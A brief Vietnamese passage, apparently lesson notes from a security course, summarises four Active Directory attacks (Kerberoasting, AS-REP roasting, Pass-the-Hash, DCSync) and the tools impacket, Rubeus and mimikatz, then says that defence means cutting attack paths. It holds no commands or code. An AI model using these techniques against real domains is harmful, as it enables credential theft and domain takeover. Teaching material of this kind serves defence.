+- Bốn kỹ thuật kinh điển, cùng công cụ impacket/Rubeus/mimikatz: Kerberoasting và AS-REP roasting lấy hash để bẻ khoá, Pass-the-Hash dùng hash thẳng không cần bẻ, DCSync rút hash của cả domain.
+- Nhiều kỹ thuật kết thúc bằng một hash đem bẻ khoá (bài 2.6) hoặc dùng thẳng. Phòng thủ là cắt đường đi, không phải vá từng lỗi riêng lẻ.
